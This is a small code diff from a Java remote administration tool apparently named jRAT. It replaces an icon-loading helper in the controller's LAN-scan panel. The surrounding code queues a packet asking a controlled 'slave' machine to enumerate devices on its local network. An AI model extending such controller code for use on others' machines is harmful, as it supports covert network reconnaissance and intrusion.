@@ -1,6 +1,6 @@
 package jrat.controller.ui.panels;
 
-import iconlib.IconUtils;
+import jrat.api.Resources;
 import jrat.controller.Slave;
 import jrat.controller.packets.outgoing.Packet71LocalNetworkDevices;
 import jrat.controller.ui.DefaultJTable;
@@ -63,7 +63,7 @@ public class PanelControlLANScan extends PanelControlParent {
 				slave.addToSendQueue(new Packet71LocalNetworkDevices());
 			}
 		});
-		btnReloadList.setIcon(IconUtils.getIcon("update"));
+		btnReloadList.setIcon(Resources.getIcon("update"));
 
 		JButton btnClear = new JButton("Clear");
 		btnClear.addActionListener(new ActionListener() {
@@ -71,7 +71,7 @@ public class PanelControlLANScan extends PanelControlParent {
 				clear();
 			}
 		});
-		btnClear.setIcon(IconUtils.getIcon("clear"));
+		btnClear.setIcon(Resources.getIcon("clear"));
 
 		progressBar = new JProgressBar();
 		progressBar.setIndeterminate(true);
